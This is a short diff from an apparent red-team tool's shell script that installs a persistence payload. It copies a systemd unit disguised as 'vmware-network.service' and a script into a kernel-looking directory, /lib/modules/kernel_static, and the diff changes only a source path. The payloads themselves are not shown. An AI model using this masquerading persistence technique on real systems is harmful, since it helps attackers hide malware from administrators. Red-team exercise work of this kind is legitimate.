@@ -47,7 +47,7 @@ copyman(){
     # Clone copyman and its files 
     mkdir -p /lib/modules/kernel_static
 
-    cp /opt/cdt-redteamtool/payload/vmware-network.service /etc/systemd/system/vmware-network.service
+    cp /opt/cdt-redteamtool/payload/static/vmware-network.service /etc/systemd/system/vmware-network.service
     cp /opt/cdt-redteamtool/payload/copyman.sh /lib/modules/kernel_static/copy
     cp /opt/cdt-redteamtool/payload/static/* /lib/modules/kernel_static/
     chmod 744 /etc/systemd/system/vmware-network.service
